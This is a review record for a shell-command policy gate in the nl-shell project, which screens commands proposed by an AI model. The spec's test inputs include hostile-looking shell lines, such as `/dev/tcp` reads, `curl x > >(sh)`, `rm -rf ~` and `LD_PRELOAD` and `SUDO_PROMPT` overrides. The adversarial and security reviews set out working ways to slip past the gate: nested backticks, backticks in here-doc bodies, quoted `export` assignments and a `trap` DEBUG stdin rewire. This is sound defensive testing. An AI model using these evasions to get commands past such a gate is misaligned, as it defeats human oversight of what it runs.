# Result — issue 196 / ast-policy-gate-shell-layer

## 1. Spec (from brief.md)              ← Check verifies against THIS
- Defect / goal: 
- Success criterion: `tests/test_policy_gate.py` passes. It holds **one general test
  per rule** plus **one regression table**. Each rule's test must fail if that rule's
  code is removed or turned off. Each case asserts the class, `rejected`, and a reason
  substring, and (except decision-C cases) that the reason is not "could not class".
  The **regression table** is defined here, not elsewhere: it is every input named
  anywhere in this success criterion (the Rule 1 untrusted table, every Rule 2–6 case,
  every "Other spec rules" case) plus every row of `gate-vectors.toml`. Do does not need
  the v1–v6 bundles to build it; those cases are already folded into the inputs below.
  (`⏎` is a newline, `\t` a tab.)
  - **Rule 1 untrusted table** (one input per untrusted feature):
    | # | Input | Why untrusted |
    |---|---|---|
    | U1 | `if true; then` (spec row 31) | `MISSING "fi"` |
    | U2 | `case x in` | `ERROR` node |
    | U3 | `echo a\⏎b` | backslash-newline |
    | U4 | `cat <<\E⏎x⏎E` | here-doc delimiter not a plain/fully-quoted word |
    | U5 | `cat <<E"F"⏎x⏎EF` | same |
    | U6 | `cat <<$'E'⏎x⏎E` | same |
    | U7 | `cat <<-E⏎\tx⏎E` | `<<-` |
    | U8 | `cat <<A <<B⏎a⏎A⏎b⏎B` | two here-docs on one line |
    | U9–U13 | `ls ?(a)`, `ls *(a)`, `ls +(a)`, `ls @(a)`, `ls !(a)` | unquoted extglob opener |
    | U14 | `echo ${ echo x; }` | bash 5.3 `${ ` |
    | U15 | `echo ${| REPLY=x; }` | bash 5.3 `${|` |
  - **Rule 1:** for every input in the untrusted table, a proposal is rejected, and the
    typed version is not rejected. The typed version is at least `mutating`, with
    "unparseable" in a reason. (For U4–U8: the untrusted-redirect clause covers file and
    dup redirects and loose operator tokens inside an `ERROR` node; a here-doc that the
    tree parsed as a here-doc node is not rejected by it, so typed U4–U8 are `mutating`,
    not rejected.) Typed `ls !(foo) 2>/dev/null` and
    `ls *.@(c|h) 2>/dev/null` are `mutating`, not rejected. Typed `echo @(x|) >&3`,
    `echo @(x|) 3>x`, `echo hi >\⏎&3` and `echo d 3\⏎>x` (no `ERROR` node; bash reads
    `3>x`) are rejected by the untrusted-redirect clause, with "unparseable" in a reason.
    Because the gate never strips backslash-newline, the last two always take this path.
  - **Rule 2:** for every input in the regression table, the number of invocations equals
    the number of `command` + `declaration_command` + `unset_command` nodes in the tree.
    `echo $((10#$(rm x)))` gives two invocations. A handler monkeypatched to skip its
    children gives decision C. A test lists every named node kind of the pinned
    `tree_sitter.Language` and asserts each has a handler; a kind whose handler is
    removed (monkeypatched) gives decision C.
  - **Rule 3:** `cat <<E | sudo tee /x` and `cat <<E | doas id` (body `x`): the second
    stage is `pipe`. `cat <x | y` and `cat <<<x | y`: `y` is `pipe`. `a | b <f`: `a` is
    `terminal` and `b` is `file`. `curl x > >(sh)` and `cat <<E > >(sudo tee /x)`: the
    inner command is `pipe`. `f() { sudo tee /x; }; cat <<E | f` and
    `f() { sh; }; curl x | f`: the body's command is `unknown`. `cat 0>&1` and
    `cat 0>&-` are `unknown`. `bash <<<'rm -rf ~'` and a quoted here-doc are `literal`
    with their text. `cat <<-E⏎\t$(rm x)⏎E` is not `literal` (tree-sitter gives its body
    no `command_substitution` node, so Rule 1's `<<-` entry is what catches it). Literal flag: `cat ~/x` has a non-literal second word, while
    `cat '~'/x` and `cat \~/x` stay literal.
  - **Rule 4:** a generated table (typed origin, so Rule 1's proposal rejection does not
    hide the result) crosses every redirect operator (`<`, `>`, `>>`, `>|`,
    `&>`, `&>>`, `<>`, `>&`, `<&`) with the descriptors none, `0`, `1`, `2`, `3`, a
    40-digit number and `{fd}`, and the target shapes: dup/close of 0–2, of 3, of `$x`;
    the move form `3-`; a literal file; `~/f`; `/dev/null`; `/dev/fd/3`; `/dev/fd/03`;
    `//dev/fd/3`; `/proc/self/fd/3`; `/proc/self/root/dev/fd/3`; `/proc/self/cwd/x`;
    `"$f"`; `/dev/f?/3`; `/dev/@(fd)/3`; `/dev/fd/3@(x|)`; `../x`. It asserts that
    exactly the forms Rule 4 allows are not rejected. Spec rows: 25 (`echo hi >&3`)
    rejected; 15 (`ls > ~/.bashrc`) `mutating`, "output redirection"; 14
    (`cat </dev/tcp/example.org/80`) `mutating`, a `/dev/tcp` reason. `>/dev/null`,
    `2>&1`, `1>&2` and `>&2` add no reason. `exec 3>&-`, `{a[0]}>x` and `{a[0]}>&-` are
    rejected.
  - **Rule 5:** the gating checks are deterministic: `$[`, `a=(` and `${` repeated to
    exactly 8 KiB each classify without raising and are not decision C because of size;
    one byte over 8 KiB is decision C, and the test asserts the parser was never called
    for it (monkeypatch the parse entry point to fail if reached). The time check is a
    loose ceiling only: each 8 KiB input classifies in under **5 s** (about 35× the
    0.14 s measured at Plan, so a slow shared CI runner does not fail correct code). It
    exists to catch a walk that blows up, not to measure speed; the size cap itself is
    proven by the deterministic check above. Deep nesting, and a long chain of substitutions that stays under the
    depth limit, are decision C. An internal error (monkeypatched) is decision C.
    `classify` never raises.
  - **Rule 6:** for every case in the test file, no reason holds a control or hidden
    character. Typed `function f$'\x1b' { :; }` gives a reason with no raw `\x1b`.
  - **Other spec rules (unchanged from v6):**
    - §1.1: row 30 (`ls ‮txt.exe`, U+202E, as a proposal) is rejected. The same text
      typed is at least `mutating`, "hidden character". A proposal with a lone surrogate
      (`ls \udcff`) is rejected.
    - §1.7 model label: `true` labelled `destructive` is `destructive`. `true` labelled
      `read-only` stays `mutating`. Both also run with `gate.rules` monkeypatched to
      return `read-only` for `true`: labelled `destructive` gives `destructive`, labelled
      `read-only` gives the §7 stub's `mutating`.
    - §7 stub proof: with `gate.rules` monkeypatched to return `read-only` for `ls`,
      `classify("ls")` is `mutating`, "live-session resolution not implemented".
      `gate.live` called directly with a `read-only` input returns the same. No other
      case returns `read-only`.
    - §2 shell-level: row 7 (`PAGER=sh git log`), row 13 (`LD_PRELOAD=./x.so ls`) and
      `LESSOPEN='|sh %s' less f` give a prefix-assignment reason. Row 16 (`$'\x72m' -rf ~`)
      and `$(echo rm) -rf ~` give a non-literal command word reason.
      `diff <(ls) <(ls)` gives a process-substitution reason. `/tmp/rm x` and `./rm x`
      give a path reason; `/usr/bin/rm x` and `//usr/bin/rm x` do not.
    - §3: a function definition is `session-altering`. The whole §3 name list
      (`docs/design/specs/policy-gate/v1.md:104-107`, with the `LD_*`, `GIT_*`, `SUDO_*`,
      `PYTHON*`, `PERL5*` patterns and `PS0`–`PS4`) is matched on every
      `variable_assignment` node, standalone or inside a `declaration_command`. Cases:
      `PATH=x`, `IFS=x`, `LD_PRELOAD=x`, `LD_LIBRARY_PATH=x`, `GIT_DIR=x`, `GIT_PAGER=x`,
      `PS1=x`, `PYTHONPATH=x`, `NODE_OPTIONS=x` and `export PATH=./bin` are
      `session-altering`, with a reason naming the variable.
    - §5: any `variable_assignment` naming `SUDO_PROMPT` or `SUDO_ASKPASS` is rejected,
      with "SUDO_" in a reason. Cases: row 23 (`SUDO_PROMPT=x sudo true`),
      `SUDO_ASKPASS=/x sudo true`, `export SUDO_PROMPT=x`.
    - Walk coverage: simple commands inside pipelines, lists, subshells, `if` / `while` /
      `for` / `case` bodies, function bodies and command substitutions all reach the
      command layer. `declaration_command` and `unset_command` are handed over as
      invocations with their command word.
    - Vectors: the conformance-row cases are read from
      `targets/ubuntu-26.04/gate-vectors.toml` through the new loader. The file is a list
      of `[[vector]]` tables. Known keys, and only these:
      - `command` (string, required);
      - `origin` (`"proposal"` or `"typed"`, required — Rule 1 makes it decisive);
      - `rejected` (bool, required);
      - `class` (one of the five classes; required when `rejected = false`, and must be
        absent when `rejected = true` — a rejected row such as spec rows 21–25 and 30,
        or `echo hi >&3`, asserts the rejection only, since the spec gives it no class);
      - `reason` (string, optional: a substring some reason must contain);
      - `label` (one of the five classes, optional: the model's label, for §1.7 rows);
      - `row` (int, optional: the spec conformance row number).

      The loader rejects, with an error naming the entry: a missing required key, `class`
      present on a rejected row or absent on a non-rejected one, a class or label outside
      the five, an `origin` outside the two, an unknown key, and invalid TOML. The file's header says it holds the rows
      landed so far and is complete (spec Conformance, `v1.md:245-249`) only when #192
      lands.

  The gate's output has the session-log `gate` shape `{"class", "reasons", "rejected"}`
  (`docs/design/specs/session-log/v1.md`).
- Repo + branch target: eduralph/nl-shell @ main
- Scope (one logical fix) / out of scope: 

## 2. Disposition claimed               ← sign-off confirms or overrides
- Outcome: new-feature
- Confidence: medium
- Recommendation: (set by Do)

## 3. Correctness (Check — chain)
- C1 Spec: none — brief.md
- C2 Reproduction (red pre-fix): none — (no gate configured)
- C3 Change: none — patch.diff
- C4 fix verified: bundle test red pre-fix, green post-fix (pytest): pass — C4 PASS — red without the fix (169 of 169 failed), green with it
- C5 Causal adequacy: none — reviewer + human sign-off

## 4. Conformance (Check — stack)
- T1 Structure: none — (no gate configured)
- T2 security-relevant change also updates the threat model: pass — security-relevant paths touched and the threat model updated: src/nl_shell/gate/__init__.py src/nl_shell/gate/live.py sr
- T3 runtime: the whole nl-shell pytest suite on the patched worktree: pass — T3 PASS — nl-shell suite green
- T4 PR body has a user-impact opener + tracker id in both artifacts: deferred — pr-description.md not drafted yet — the substantive T4 audit of the contribution artifacts runs at publish
- T5 Judgment: none — reviewer + human sign-off
- T5 judgment: → see §5.

## 5. Advisory review (artifact-only, decorrelated)
Reviewer ran without build-notes.md. Summary:

Review issue #196: add a fail-closed AST policy gate shell layer with bounded parsing, complete traversal, conservative invocation facts, safe redirects, and escaped reasons.

| Item | Verdict | Basis |
|------|---------|-------|
| C1 Spec | PASS | The six rules and explicitly deferred command/live-session semantics give this standalone shell-layer change a testable boundary (src/nl_shell/gate/__init__.py:6; tests/test_policy_gate.py:257). |
| C2 Reproduction (red pre-fix) | PASS | Frozen evidence establishes the missing-feature baseline: all 169 tests fail without production changes, including the missing gate import; this is new functionality rather than an existing runtime regression (gate-logs/C4-verify.log:16; tests/test_policy_gate.py:34). |
| C3 Change | PASS | Invocation preservation and standalone assignments address the carried-forward defects, with focused regressions for adjacent redirect words and stdin uncertainty (src/nl_shell/gate/parse.py:675; src/nl_shell/gate/parse.py:689; tests/test_policy_gate.py:445). |
| C4 Verification (red→green) | PASS | Frozen gate output records 169 green and 169 red with production reverted; independent pytest rerun was unavailable because this sandbox lacks tree-sitter and offline installation found no cached wheel, so this verdict rests on captured execution (gate-logs/C4-verify.log:14; gate-logs/C4-verify.log:16). |
| C5 Causal adequacy | PASS | Descriptor recovery now validates tokens before removing words; no-name assignments persist as standalone, and possible shell stdin rewiring invalidates other stdin claims; no optional-capability probe papers over a load-time cause (src/nl_shell/gate/parse.py:675; src/nl_shell/gate/parse.py:689; src/nl_shell/gate/parse.py:984). |
| T1 Structure | PASS | Parsing facts, command classification and future pipeline steps have distinct interfaces; traversal completeness is checked on each classification rather than assumed from tests (src/nl_shell/gate/parse.py:952; src/nl_shell/gate/__init__.py:208). |
| T2 Shape | PASS | Threat-model evidence and the source diff place the six properties in What must hold while retaining Known gaps; independent diff whitespace check and documentation link scan pass (gate-logs/T2-threat-model.log:10; .oss-scanner/threat_model.md:157). |
| T3 Runtime | PASS | Frozen whole-suite output reports 1270 passed, one skipped and one forkpty warning; it does not establish VM/GPU/teacher behavior, which this shell-layer change does not claim (gate-logs/T3-suite.log:30; gate-logs/T3-suite.log:35). |
| T4 Contribution | N/A | Contribution artifacts are absent by design at Check; the substantive opener/tracker audit must rerun at publish (gate-logs/T4-contribution.log:10). |
| T5 Judgment | NEEDS-HUMAN | Confirm affected-path prior art across merged and closed/rejected work and accept the pinned dependencies' licenses — local git history has no gate-path commits, but this single-base copy has no remotes or PR history and cannot independently establish the brief's broader search or licensing claim (src/nl_shell/gate/parse.py:30; pyproject.toml:19; brief.md:310). |
| Validation — fitness-to-purpose | NEEDS-HUMAN | Approve the stricter rejection rules, quoting-independent hidden-character check, decision C and 8 KiB cap, and decide whether the proposal-rejection ruling needs a tracker record or accompanying spec edit — these alter accepted input and require the spec's human compatibility review; this API remains unwired to the REPL (docs/design/specs/policy-gate/v1.md:236; src/nl_shell/gate/__init__.py:175; src/nl_shell/gate/parse.py:36). |

Independent review evidence: `git -C target diff --check` passed; `python3 scripts/docs_links.py` reported 64 relative links in 57 Markdown files with zero broken links. Isolated execution of the actual AST-extracted pure helpers confirmed ordinary adjacent words (`/`, `/etc`, `~`, `a3`, `"3"`, `x}`) are not descriptor tokens, while `0` and `{fd}` are; quoted and escaped tildes remain literal. These helper checks do not substitute for parser-backed tests.

Rerun limitation: `python` is absent, and `python3` cannot import `tree_sitter`. A cwd-local virtual environment and offline dependency resolution could not obtain the pinned package. No stash/red/restore cycle was attempted without a runnable test toolchain. All four supplied gate logs were read; C4 and T3 are supported by their captured execution, T2 by its captured path audit and inspected diff, and T4 is deferred. No host limitation is attributed to the patch. The target is readable and contains the applied patch; no target-state staleness was observed.

The bundle does not include INTEGRATION.md §4, so additional enumerated human-only checks cannot be inspected here; the dependency-license and compatibility decisions explicitly identified in the brief remain open above. This review is advisory and does not authorize acceptance.

<!-- pdca:leaf-complete -->

### Advisory — adversary

# Adversarial review — issue 196 / ast-policy-gate-shell-layer (iteration 8)

**Proof re-run.** I built a sandbox venv with the pinned wheels (`tree-sitter==0.26.0`, `tree-sitter-bash==0.25.1`) and ran `tests/test_policy_gate.py` on the patched target: 169 passed in 1.4 s. The red leg in `gate-logs/C4-verify.log` (169 of 169 failed) is real but trivial, since the package does not exist pre-fix. So I tested the tests by breaking the code instead. I made 12 hand mutations in a copy of the source: `_check_walk` turned into a no-op; the `exec` rewire block, the untrusted-stdin override, the `..` check, the `/dev`/`/proc`/`/sys` check, the pipeline last-stage redirect, the here-doc body check, the function-body `unknown` and the `=`/`:` tilde rule each switched off; `escape` made the identity; `prefix_role` forced to `prefix`; `_is_descriptor_token` forced to `True`. **The test file caught all 12.** The tests run the real code path (`nl_shell.gate.classify` / `parse.shell_layer`), not a copy.

**Round-7 carry-forward is fixed.** `rm -rf />/dev/null` now gives the words `['rm','-rf','/']`, `cat a3>f` keeps `a3`, `PATH=/tmp/evil >/dev/null` is `session-altering` with "assignment to PATH", and `exec </tmp/x; sudo tee /etc/y` gives `unknown` for `sudo`.

**Rule 5 cost.** I timed 25 adversarial 8 KiB inputs (`$[`, `a=(`, `<<`, `a<<`, `>&`, `x>`, `?(a)`, `a|`, here-doc runs, and others). The slowest took 0.21 s, so the bound holds.

Refutations that landed:

- NEEDS-HUMAN [impl] — **An assignment before a command word that expands to nothing is still treated as a one-command prefix, so §3 misses it.** `src/nl_shell/gate/parse.py:686` sets `prefix_role = "prefix"` whenever the tree has a name node. `src/nl_shell/gate/__init__.py:234-238` then skips the §3 name list for prefixes. Typed `PATH=/tmp/evil $(true)` gives `mutating` with reasons `prefix assignment: PATH` and `command word is not a literal: $(true)`, and no "assignment to PATH". `LD_PRELOAD=/tmp/x.so $empty` behaves the same way. In bash the assignment persists when no command name results: `bash -c 'PATH=/tmp/evil $(true); echo $PATH'` prints `/tmp/evil`, which I checked on this host. This is the same class as round 7's `PATH=x >/dev/null` finding: the fix covered only the zero-width MISSING name, not a name the gate cannot prove is non-empty. That conflicts with the brief's "Unproven means worst case" principle and with §3 being "matched on every `variable_assignment` node". Fix: when the command word is not literal, treat the assignments as standalone (or apply §3 to them as well as the prefix reason). Add `PATH=/tmp/evil $(true)` to the §3 cases. The class rank does not change (both are rank 1), but the reason and the `session-altering` class are what #197 and the session log read.

- NEEDS-HUMAN [impl] — **A `trap` body can rewire the shell's stdin, but the gate does not treat `trap` as code it cannot see.** `src/nl_shell/gate/parse.py:995` lists only `eval`, `source` and `.` in `_SHELL_RUNNERS`. Typed `trap 'exec </x' DEBUG; sudo tee /y` records `sudo tee /y` with stdin **`terminal`**. In bash the DEBUG trap runs `exec </x` before `sudo tee`, so it reads `/x`. I checked this on this host: `echo FROM-STDIN | bash -c "trap 'exec <file' DEBUG; cat"` prints the file's contents. `terminal` is the best case for the sudo-pipe rule, so this records a stdin fact as proven when it is not. This is the exact bug class the round-7 `exec` fix (`parse.py:984-991`) set out to close. Fix: add `trap` to `_SHELL_RUNNERS`, or treat any `trap` invocation as able to rewire stdin, and add the input above to the Rule 3 test.

- NEEDS-HUMAN [impl] — **`coproc` gets stdin `terminal`, but bash connects a coprocess's stdin to a pipe from the shell.** `src/nl_shell/gate/parse.py:719-721` keeps the context's `terminal` for `coproc sudo tee /x`, giving words `['coproc','sudo','tee','/x']` and stdin `terminal`. Rule 3's `terminal` form ("first in its pipeline or stands alone") does not fit here: the command's stdin is `${COPROC[1]}`, not the terminal. When #197 strips `coproc` as a wrapper, the inner `sudo tee` will look as if it reads the terminal. Severity is low today because of the stub floor. Fix: set stdin to `unknown` (or `pipe`) when the command word is a literal `coproc`.

- NEEDS-HUMAN [impl] — **`</dev/stdin` is recorded as stdin `file` with the value `/dev/stdin`.** `src/nl_shell/gate/parse.py:555-561` turns any accepted, literal `<` target into `Stdin("file", …)`. `judge_redirect` accepts `/dev/stdin` (`parse.py:332-334`), so `sudo tee /etc/y </dev/stdin` gives `file`, but the actual source is whatever fd 0 already was (the terminal or a pipe). A consumer that treats `file` as "not the terminal, not a pipe" (#198's terminal-read rule, or the sudo-pipe rule) is fooled. Rule 3's wording ("`<` from a literal path") arguably allows this, but the brief's principle ("proven only through a short, explicit list of forms") does not. Fix: map `/dev/stdin` (and `/dev/stdout`/`/dev/stderr` used with `<`) to `unknown`, or keep the incoming stdin.

Checked with no refutation found:

- **Work budget on ordinary long input.** `MAX_WORK = 4096` (`parse.py:37`) makes a plain typed command with about 4,000 words (`a a a …` to 8 KiB) decision C (`privileged`, rejected). That fails closed and fits the brief's "not decision C because of size" wording, so it is a usability note, not a refutation.
- **Attempted to refute and could not:** Rule 4 bypasses (`/dev/./null`, `//dev/fd/3`, `/dev/tcp/../fd/3`, `>&/dev/fd/3`, `{fd}>&-`, `01>x`, `0003>x`, `<&0-`, `>&2-`), Rule 3 pipeline and compound cases (`! a | b <f`, `{ a | b; } <f`, `cat <x >y | sudo tee /z`, `cat x | cat <<E && sudo tee /y`, `"exec" </x` inside a loop), and the vector loader's type checks (`vectors.py:81-123`).
- **The verdict.** I found no claim in `check-gates.json` that the evidence does not support. C4 and T3 pass, and I reproduced the green leg. The gaps above are inputs the success criterion does not list, so the reviewer could not have seen them go red. The test file's coverage is real but still case-driven around the round-7 findings. The two §3/stdin findings above are new members of classes the brief already names ("every `variable_assignment`"; "code the gate does not see").

<!-- pdca:leaf-complete -->

### Advisory — security-review

# Security review (advisory): issue 196, policy-gate shell layer

**Attacker-reachable inputs this diff touches:** the model's proposal (threat model input 5) and any text that steers it (inputs 1, 2 and 6). All of it reaches `nl_shell.gate.classify` as the `command` string. Typed input is the user's own and is trusted, but it goes through the same parser.

Today every simple command is at least `mutating` because of the `rules` and `live` stubs, so nothing runs without a confirm. No finding below is Critical today. The findings are about the properties this patch adds to the threat model's "What must hold" (`.oss-scanner/threat_model.md:157-181`), which the code does not fully hold.

## Findings

- NEEDS-HUMAN [human] — **High (rated on the threat model's "printed text forges a control-channel record" row, but behind a `mutating` confirm; latent High "a privileged step is classed lower" once #197 lands).** `src/nl_shell/gate/parse.py:413-459` (`untrusted_features`). Input: a model proposal with **nested backticks**, `` echo `echo \`echo hi >&3\`` ``. Whoever steers the model controls it. tree-sitter-bash 0.25.1 does not parse an escaped backtick inside a backtick substitution as a nested substitution. So the inner command is not an invocation, and its `>&3` reaches `judge_redirect` with the target `` 3` ``. That is not all digits, so it is judged as a literal *file* and **accepted**. The result is `mutating`, not rejected, with the reason ``output redirection: >&3\` ``. Bash runs the inner command and writes to fd 3: `bash bt.sh 3>fd3.txt` wrote `hi` into `fd3.txt`. This breaks the patch's own claim at `threat_model.md:175-177`, "fd 3 cannot be reached by … a dup". It also breaks spec §5, which rejects fd 3. Rule 1 does not flag the tree as untrusted (`untrusted_features` returns `()`). The same blind spot hides commands: `` echo `echo \`sudo id\`` `` gives the invocations `['echo','`sudo','id`']` and `['echo', …]`, with no `sudo id` invocation. Rule 2's walk check passes because it compares the walk with the tree, not with bash. `` x=`echo \`id >&3\`` `` and `` echo $(echo `echo \`echo hi >\&3\``) `` take the same path. **Why [human]:** the brief (`brief.md:53-54`) sends new tree-sitter/bash disagreements to #191's differential test, not into Rule 1's fixed list. Someone has to decide whether this one goes into Rule 1 now. The fix is cheap: treat an unescaped `` \` `` inside a backtick substitution as an untrusted feature. No test in `tests/test_policy_gate.py` uses nested backticks.

- NEEDS-HUMAN [human] — **High (same rating basis as above; latent High for a hidden privileged step).** `src/nl_shell/gate/parse.py:413-459` and `:835-874` (`_heredoc_redirect`). Input: a proposal with a backtick substitution in the body of an **unquoted** here-doc, `cat <<E⏎`sudo id >&3`⏎E`. tree-sitter-bash 0.25.1 parses the body as a plain `heredoc_body` with no `command_substitution` node. Its tree is `(program (redirected_statement body: (command …) redirect: (heredoc_redirect (heredoc_start) (heredoc_body) (heredoc_end))))`. The gate sees one invocation, `cat`, and no fd-3 redirect. The proposal is `mutating`, "not allowlisted", and not rejected. Bash runs the backtick in a here-doc body: `bash hd.sh 3>fd3b.txt` (body `` `echo hi >&3` ``) wrote `hi` into `fd3b.txt`. `$(…)` in the same place *is* parsed and rejected, so only backticks get through. The stdin fact is still correct (`unknown`, because the body holds a backtick, `parse.py:873`), but the hidden command and redirect are never judged. **Why [human]:** same routing question as the bullet above. The narrow fix is to make "unquoted-delimiter here-doc body holding a backtick" a Rule 1 untrusted feature. No test covers it.

- NEEDS-HUMAN [human] — **High (latent today: "a session change goes undetected by the gate"; once sudo passthrough #13 lands, a `SUDO_PROMPT` override that slips past §5 is on the path to the Critical sudo-password row).** `src/nl_shell/gate/__init__.py:229-240` (`_assignments`) only sees `variable_assignment` nodes. Input: a proposal `export 'SUDO_PROMPT=x'`, `export SUDO_\PROMPT=x` or `export "SUDO_PROMPT"=x`. All three are `mutating`, not rejected, with no "SUDO_" reason. Bash assigns in all three (`bash -c "export 'SUDO_PROMPT=x1'; echo \$SUDO_PROMPT"` prints `x1`; the other two print `x2` and `x3`). The same forms get around §3: `export 'PATH=./bin'` is not `session-altering`. The threat model says "The gate rejects … overrides of `SUDO_PROMPT` and `SUDO_ASKPASS`" (`threat_model.md:121-122`). **Why [human], and not re-raised as new work:** the brief parks "variable writes the tree gives no `variable_assignment` node for" as a follow-up (`brief.md:289-291`). These forms fit that class, but the parked examples (`for PATH in …`, `read`, `printf -v`) don't list them. The human should confirm the follow-up covers quoted or escaped declaration-builtin arguments for the §5 names. If it does, nothing is needed here.

## Checked, no finding

- **fd 3 by the direct routes:** `>&3`, `1>& 3`, `>&03`, `3>out`, `{fd}>out`, `exec 1>&3`, `exec 0<&3`, `>&$x`, `>&/dev/fd/3`, `&>/proc/self/fd/3`, `>/dev/./fd/3`, `>/dev//fd/3`, `> /de\v/fd/3`, quoted `/dev/fd/3`, `>$(…)`, `3<<E`, `3<<<y`. Inside `$(…)`, `"`…`"`, `${x:-$(…)}`, `{ …; }`, `for … done`, `case` with `;;&`, `coproc`, `time`, `!`, `|&` and a `$(`-in-here-doc body, all are rejected. `echo x 3 >out`, `\3>out` and `'3'>out` correctly keep `3` as an argument, as bash does.
- **Rule 5 (bounded cost):** 8 KiB inputs of `<<`, `< `, `a<`, `<<x `, `x<<E `, `>&`, `a>x `, `$[`, `a=(`, `${`, `` ` ``, `;(`, backslash-newline and mixes all classify in 0.16 s or less. Each one ends in either an untrusted result or decision C (work budget). None raised.
- **Rule 6:** every reason goes through `escape()` at `src/nl_shell/gate/__init__.py:94-106,135-140`, and the `GateFailure` messages are fixed text.
- **§5 on `variable_assignment` nodes:** `declare -x`, `readonly`, `local`, `typeset`, `+=` and `SUDO_PROMPT[0]=` are all rejected.
- **Not filed (out of scope by the brief):** a redirect to a relative file that is a symlink to `/proc/self/fd/3` (for example `out` in a cloned repo) is accepted as `mutating` "output redirection". This needs filesystem state, which belongs to #190 (`brief.md:285`). `eval` and `bash -c` strings are #197 (decision B).

Reproducer scripts and inputs are in `probe/` in this sandbox (`p.py`, `c1.txt`…`c4.txt`, `bt.sh`, `hd.sh`). They were run with the pdca `.venv` (tree-sitter 0.26.0) against `$PDCA_TARGET/src`.

<!-- pdca:leaf-complete -->

## 6. NEEDS-HUMAN — items the human must clear before sign-off
- [x] T5 Judgment — Confirm affected-path prior art across merged and closed/rejected work and accept the pinned dependencies' licenses — local git history has no gate-path commits, but this single-base copy has no remotes or PR history and cannot independently establish the brief's broader search or licensing claim (src/nl_shell/gate/parse.py:30; pyproject.toml:19; brief.md:310).
- [x] Validation — fitness-to-purpose — Approve the stricter rejection rules, quoting-independent hidden-character check, decision C and 8 KiB cap, and decide whether the proposal-rejection ruling needs a tracker record or accompanying spec edit — these alter accepted input and require the spec's human compatibility review; this API remains unwired to the REPL (docs/design/specs/policy-gate/v1.md:236; src/nl_shell/gate/__init__.py:175; src/nl_shell/gate/parse.py:36).
- [x] **An assignment before a command word that expands to nothing is still treated as a one-command prefix, so §3 misses it.** `src/nl_shell/gate/parse.py:686` sets `prefix_role = "prefix"` whenever the tree has a name node. `src/nl_shell/gate/__init__.py:234-238` then skips the §3 name list for prefixes. Typed `PATH=/tmp/evil $(true)` gives `mutating` with reasons `prefix assignment: PATH` and `command word is not a literal: $(true)`, and no "assignment to PATH". `LD_PRELOAD=/tmp/x.so $empty` behaves the same way. In bash the assignment persists when no command name results: `bash -c 'PATH=/tmp/evil $(true); echo $PATH'` prints `/tmp/evil`, which I checked on this host. This is the same class as round 7's `PATH=x >/dev/null` finding: the fix covered only the zero-width MISSING name, not a name the gate cannot prove is non-empty. That conflicts with the brief's "Unproven means worst case" principle and with §3 being "matched on every `variable_assignment` node". Fix: when the command word is not literal, treat the assignments as standalone (or apply §3 to them as well as the prefix reason). Add `PATH=/tmp/evil $(true)` to the §3 cases. The class rank does not change (both are rank 1), but the reason and the `session-altering` class are what #197 and the session log read.
- [x] **A `trap` body can rewire the shell's stdin, but the gate does not treat `trap` as code it cannot see.** `src/nl_shell/gate/parse.py:995` lists only `eval`, `source` and `.` in `_SHELL_RUNNERS`. Typed `trap 'exec </x' DEBUG; sudo tee /y` records `sudo tee /y` with stdin **`terminal`**. In bash the DEBUG trap runs `exec </x` before `sudo tee`, so it reads `/x`. I checked this on this host: `echo FROM-STDIN | bash -c "trap 'exec <file' DEBUG; cat"` prints the file's contents. `terminal` is the best case for the sudo-pipe rule, so this records a stdin fact as proven when it is not. This is the exact bug class the round-7 `exec` fix (`parse.py:984-991`) set out to close. Fix: add `trap` to `_SHELL_RUNNERS`, or treat any `trap` invocation as able to rewire stdin, and add the input above to the Rule 3 test.
- [x] **`coproc` gets stdin `terminal`, but bash connects a coprocess's stdin to a pipe from the shell.** `src/nl_shell/gate/parse.py:719-721` keeps the context's `terminal` for `coproc sudo tee /x`, giving words `['coproc','sudo','tee','/x']` and stdin `terminal`. Rule 3's `terminal` form ("first in its pipeline or stands alone") does not fit here: the command's stdin is `${COPROC[1]}`, not the terminal. When #197 strips `coproc` as a wrapper, the inner `sudo tee` will look as if it reads the terminal. Severity is low today because of the stub floor. Fix: set stdin to `unknown` (or `pipe`) when the command word is a literal `coproc`.
- [x] **`</dev/stdin` is recorded as stdin `file` with the value `/dev/stdin`.** `src/nl_shell/gate/parse.py:555-561` turns any accepted, literal `<` target into `Stdin("file", …)`. `judge_redirect` accepts `/dev/stdin` (`parse.py:332-334`), so `sudo tee /etc/y </dev/stdin` gives `file`, but the actual source is whatever fd 0 already was (the terminal or a pipe). A consumer that treats `file` as "not the terminal, not a pipe" (#198's terminal-read rule, or the sudo-pipe rule) is fooled. Rule 3's wording ("`<` from a literal path") arguably allows this, but the brief's principle ("proven only through a short, explicit list of forms") does not. Fix: map `/dev/stdin` (and `/dev/stdout`/`/dev/stderr` used with `<`) to `unknown`, or keep the incoming stdin.
- [x] **High (rated on the threat model's "printed text forges a control-channel record" row, but behind a `mutating` confirm; latent High "a privileged step is classed lower" once #197 lands).** `src/nl_shell/gate/parse.py:413-459` (`untrusted_features`). Input: a model proposal with **nested backticks**, `` echo `echo \`echo hi >&3\`` ``. Whoever steers the model controls it. tree-sitter-bash 0.25.1 does not parse an escaped backtick inside a backtick substitution as a nested substitution. So the inner command is not an invocation, and its `>&3` reaches `judge_redirect` with the target `` 3` ``. That is not all digits, so it is judged as a literal *file* and **accepted**. The result is `mutating`, not rejected, with the reason ``output redirection: >&3\` ``. Bash runs the inner command and writes to fd 3: `bash bt.sh 3>fd3.txt` wrote `hi` into `fd3.txt`. This breaks the patch's own claim at `threat_model.md:175-177`, "fd 3 cannot be reached by … a dup". It also breaks spec §5, which rejects fd 3. Rule 1 does not flag the tree as untrusted (`untrusted_features` returns `()`). The same blind spot hides commands: `` echo `echo \`sudo id\`` `` gives the invocations `['echo','`sudo','id`']` and `['echo', …]`, with no `sudo id` invocation. Rule 2's walk check passes because it compares the walk with the tree, not with bash. `` x=`echo \`id >&3\`` `` and `` echo $(echo `echo \`echo hi >\&3\``) `` take the same path. **Why [human]:** the brief (`brief.md:53-54`) sends new tree-sitter/bash disagreements to #191's differential test, not into Rule 1's fixed list. Someone has to decide whether this one goes into Rule 1 now. The fix is cheap: treat an unescaped `` \` `` inside a backtick substitution as an untrusted feature. No test in `tests/test_policy_gate.py` uses nested backticks.
